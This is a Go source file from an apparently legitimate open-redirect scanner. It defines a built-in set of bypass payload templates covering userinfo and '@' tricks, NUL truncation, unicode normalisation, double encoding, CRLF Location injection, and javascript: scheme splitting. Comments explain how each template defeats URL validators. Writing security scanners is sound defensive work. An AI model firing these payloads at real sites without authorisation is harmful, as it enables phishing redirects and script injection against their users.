// Package payload expands built-in open-redirect templates against a canary
// and a target host, and substitutes a FUZZ keyword in operator-supplied input.
package payload

import (
	"sort"
	"strings"
)

const (
	// DefaultKeyword is the OpenRedireX-style injection mark.
	DefaultKeyword = "FUZZ"

	tokenCanary = "{{canary}}"
	tokenTarget = "{{target}}"
	// tokenValue is the parameter's current value, verbatim.
	//
	// A containment allowlist checks for a whole trusted URL, not just its
	// host, so a payload that only wears the hostname never matches. The value
	// already in the parameter is the one string the endpoint is known to
	// accept, which makes it the right thing to carry.
	tokenValue = "{{value}}"

	techA02 = "OR-A02"
	techA05 = "OR-A05"
	techA06 = "OR-A06"
	techA14 = "OR-A14"
	techA03 = "OR-A03"
	techA07 = "OR-A07"
	techB04 = "OR-B04"
	techA08 = "OR-A08"
)

// Mechanisms are the ways a destination reaches a browser. This is the one
// vocabulary: the engine tags findings with these and --filter accepts these,
// so the two cannot drift into disagreeing about what a mechanism is called.
const (
	// MechQuery carries the destination in a query parameter.
	MechQuery = "query"
	// MechCRLF smuggles a second Location header through the request path.
	MechCRLF = "crlf"
	// MechHeader carries it in a request header such as X-Forwarded-Host.
	MechHeader = "header"
	// MechPath appends it to the request path unencoded, for routers that
	// validate a cleaned path and emit a Location built from the raw target.
	MechPath = "path"
	// MechHost carries a bare hostname, for parameters a framework
	// interpolates into the destination's authority rather than its whole URL.
	MechHost = "host"
	// MechBlob carries it inside an opaque envelope.
	MechBlob = "blob"
	// MechMeta is a meta refresh tag in the response body.
	MechMeta = "meta"
	// MechRefresh is a Refresh response header.
	MechRefresh = "refresh"
	// MechJS is a navigation sink in client-side code.
	MechJS = "js"
	// MechHPP sends one parameter twice, so the validator and the sink can
	// read different copies.
	MechHPP = "hpp"
	// MechNuclei is a result an external nuclei run reported, which detour
	// did not verify itself.
	MechNuclei = "nuclei"
)

// mechanisms is every name a finding's Mechanism field may take.
var mechanisms = map[string]struct{}{
	MechQuery: {}, MechCRLF: {}, MechHeader: {}, MechPath: {}, MechHost: {},
	MechBlob: {}, MechMeta: {}, MechRefresh: {}, MechJS: {}, MechHPP: {},
	MechNuclei: {},
}

// KnownMechanism reports whether name is one detour emits.
func KnownMechanism(name string) bool {
	_, ok := mechanisms[name]

	return ok
}

// Payload is one technique-tagged template.
type Payload struct {
	Technique string
	Template  string
	Mechanism string
}

// Expand replaces the canary, target, and value tokens in p.Template.
func Expand(p Payload, canary, target, value string) string {
	out := strings.ReplaceAll(p.Template, tokenCanary, canary)
	out = strings.ReplaceAll(out, tokenTarget, target)

	return strings.ReplaceAll(out, tokenValue, value)
}

// NeedsValue reports whether a payload carries the current parameter value.
// Such a payload is pointless when there is no value to carry.
func NeedsValue(p Payload) bool {
	return strings.Contains(p.Template, tokenValue)
}

// Substitute replaces keyword with value. An empty keyword is a no-op.
func Substitute(raw, keyword, value string) string {
	if keyword == "" {
		return raw
	}

	return strings.ReplaceAll(raw, keyword, value)
}

// HasKeyword reports whether raw contains the injection mark.
func HasKeyword(raw, keyword string) bool {
	return keyword != "" && strings.Contains(raw, keyword)
}

// BuiltIn is the offline payload set used when PortSwigger data is absent.
func BuiltIn() []Payload {
	out := make([]Payload, len(builtIn))
	copy(out, builtIn)

	return out
}

var builtIn = []Payload{
	{Technique: techA07, Mechanism: MechQuery, Template: "https://" + tokenCanary},
	{Technique: techA07, Mechanism: MechQuery, Template: "//" + tokenCanary},
	{Technique: techA07, Mechanism: MechQuery, Template: "///" + tokenCanary},
	{Technique: techA07, Mechanism: MechQuery, Template: "////" + tokenCanary},
	{Technique: techA03, Mechanism: MechQuery, Template: "/\\" + tokenCanary},
	{Technique: techA03, Mechanism: MechQuery, Template: "\\/\\/" + tokenCanary},
	{Technique: techA03, Mechanism: MechQuery, Template: "https:/\\" + tokenCanary},
	{Technique: techA03, Mechanism: MechQuery, Template: "/\\/" + tokenCanary},
	{Technique: "OR-A01", Mechanism: MechQuery, Template: "https://" + tokenTarget + "@" + tokenCanary},
	{Technique: "OR-A01", Mechanism: MechQuery, Template: "https://" + tokenTarget + "%40" + tokenCanary},
	{Technique: techA08, Mechanism: MechQuery, Template: "https://" + tokenCanary + "/" + tokenTarget},
	{Technique: "OR-A09", Mechanism: MechQuery, Template: "https://" + tokenTarget + "." + tokenCanary},
	{Technique: techA08, Mechanism: MechQuery, Template: "https://" + tokenCanary + "?" + tokenTarget},
	{Technique: techA08, Mechanism: MechQuery, Template: "https://" + tokenCanary + "/?x=" + tokenValue},
	{Technique: techA08, Mechanism: MechQuery, Template: "https://" + tokenCanary + "/#" + tokenValue},
	{Technique: "OR-A01", Mechanism: MechQuery, Template: tokenValue + "@" + tokenCanary},
	{Technique: techA08, Mechanism: MechQuery, Template: "https://" + tokenCanary + "#" + tokenTarget},
	{Technique: techA06, Mechanism: MechQuery, Template: "%09//" + tokenCanary},
	{Technique: "OR-A12", Mechanism: MechQuery, Template: "%00//" + tokenCanary},
	// A validator that truncates at the NUL sees only the trusted host; the
	// sink parses the whole string and takes the authority after the "@".
	{Technique: "OR-A12", Mechanism: MechQuery, Template: "https://" + tokenTarget + "%00@" + tokenCanary + "/"},
	{Technique: techA06, Mechanism: MechQuery, Template: "%20//" + tokenCanary},
	{Technique: techA05, Mechanism: MechQuery, Template: "https://" + tokenTarget + "\u3002" + tokenCanary},
	{Technique: techA14, Mechanism: MechQuery, Template: "https:" + tokenCanary},
	{Technique: techA14, Mechanism: MechQuery, Template: "https;" + tokenCanary},
	{Technique: techA14, Mechanism: MechQuery, Template: "https:\\/\\/" + tokenCanary},
	{Technique: "OR-E01", Mechanism: MechQuery, Template: "javascript:" + tokenCanary},
	{Technique: "OR-E02", Mechanism: MechQuery, Template: "data:text/html," + tokenCanary},
	{Technique: "OR-E03", Mechanism: MechQuery, Template: "http://" + tokenTarget + "/"},
	{Technique: techB04, Mechanism: MechQuery, Template: "https%3A%2F%2F" + tokenCanary},
	{Technique: techB04, Mechanism: MechQuery, Template: "%2F%2F" + tokenCanary},
	{Technique: "OR-A11", Mechanism: MechCRLF, Template: "/%0d%0aLocation:%20https://" + tokenCanary},
	{Technique: "OR-D01", Mechanism: MechHeader, Template: tokenCanary},

	// Delimiter stuffing. These exist to beat a validator that already
	// handles a plain "@", by putting the host boundary somewhere the
	// validator and the client disagree about.
	{Technique: techA02, Mechanism: MechQuery, Template: "https://" + tokenTarget + ":@" + tokenCanary + "/"},
	{Technique: techA02, Mechanism: MechQuery, Template: "https://" + tokenTarget + ":443:\\@@" + tokenCanary + "/"},
	{Technique: techA02, Mechanism: MechQuery, Template: "https://" + tokenTarget + "%20&@" + tokenCanary + "/"},
	{Technique: techA02, Mechanism: MechQuery, Template: "https://" + tokenTarget + " &@" + tokenCanary + "/"},

	// A bracket terminates the userinfo for Spring's regex and for nothing
	// else, so the framework validates one host and the client uses another.
	{Technique: "OR-A04", Mechanism: MechQuery, Template: "https://" + tokenCanary + "[@" + tokenTarget + "/"},

	// A router that validates the cleaned path and builds Location from the
	// raw request target sends these straight back out.
	{Technique: "OR-D03", Mechanism: MechPath, Template: "//" + tokenCanary},
	{Technique: "OR-D03", Mechanism: MechPath, Template: "/\\" + tokenCanary},
	{Technique: "OR-D03", Mechanism: MechPath, Template: "/..//\\//" + tokenCanary},

	// A hostname built from request input ignores the rule's own suffix
	// constraint, so the bare host is the whole payload.
	{Technique: "OR-D02", Mechanism: MechHost, Template: tokenCanary},

	// Unicode characters that normalize to a dot or a slash. A validator
	// comparing raw bytes sees one host; the client normalizes first and
	// resolves another.
	{Technique: techA05, Mechanism: MechQuery, Template: "https://" + tokenTarget + "\uff0e" + tokenCanary},
	{Technique: techA05, Mechanism: MechQuery, Template: "https://" + tokenTarget + "\uff61" + tokenCanary},
	{Technique: techA05, Mechanism: MechQuery, Template: "https://" + tokenCanary + "\uff0f" + tokenTarget},
	{Technique: techA05, Mechanism: MechQuery, Template: "https://" + tokenCanary + "\uff3c" + tokenTarget},
	{Technique: techA05, Mechanism: MechQuery, Template: "//" + tokenTarget + "\u3002" + tokenCanary},

	// A second decode happens after the check. One encoding layer is the
	// common case; two is the one nobody tests.
	{Technique: techB04, Mechanism: MechQuery, Template: "%252f%252f" + tokenCanary},
	{Technique: techB04, Mechanism: MechQuery, Template: "%255c%255c" + tokenCanary},
	{Technique: techB04, Mechanism: MechQuery, Template: "https%253a%252f%252f" + tokenCanary},
	{Technique: techB04, Mechanism: MechQuery, Template: "%5c%5c" + tokenCanary},

	// Whitespace and control bytes a validator keeps and a browser strips.
	{Technique: techA06, Mechanism: MechQuery, Template: "%0a//" + tokenCanary},
	{Technique: techA06, Mechanism: MechQuery, Template: "%0d//" + tokenCanary},
	{Technique: techA06, Mechanism: MechQuery, Template: "%0c//" + tokenCanary},
	{Technique: techA06, Mechanism: MechQuery, Template: "/%09/" + tokenCanary},
	{Technique: techA06, Mechanism: MechQuery, Template: "/+/" + tokenCanary},

	// Separators that end the host for one parser and not the other, so the
	// trusted name ends up in a part nobody navigates to.
	{Technique: techA02, Mechanism: MechQuery, Template: "https://" + tokenCanary + "#@" + tokenTarget},
	{Technique: techA02, Mechanism: MechQuery, Template: "https://" + tokenCanary + ";@" + tokenTarget},
	{Technique: techA02, Mechanism: MechQuery, Template: "https://" + tokenCanary + ";" + tokenTarget},
	{Technique: techA02, Mechanism: MechQuery, Template: "https://" + tokenTarget + "%09@" + tokenCanary},

	// A NUL after the host truncates the string for the validator only.
	{Technique: "OR-A12", Mechanism: MechQuery, Template: "//" + tokenCanary + "%00." + tokenTarget},

	// Scheme blocklists that match the literal string, defeated by a byte in
	// the middle of it.
	{Technique: techA14, Mechanism: MechQuery, Template: "ht%09tps://" + tokenCanary},
	{Technique: techA14, Mechanism: MechQuery, Template: "https:/" + tokenCanary},
	{Technique: techA14, Mechanism: MechQuery, Template: "https:///" + tokenCanary},

	// A newline inside the scheme splits what the filter reads from what the
	// browser runs.
	{Technique: "OR-E01", Mechanism: MechQuery, Template: "java%0d%0ascript:alert(document.domain)//" + tokenCanary},
	{Technique: "OR-E01", Mechanism: MechQuery, Template: "javascript://" + tokenCanary + "%0aalert(document.domain)"},
}

// Mechanisms lists every mechanism name, sorted, for help text and validation.
func Mechanisms() []string {
	out := make([]string, 0, len(mechanisms))
	for name := range mechanisms {
		out = append(out, name)
	}

	sort.Strings(out)

	return out
}
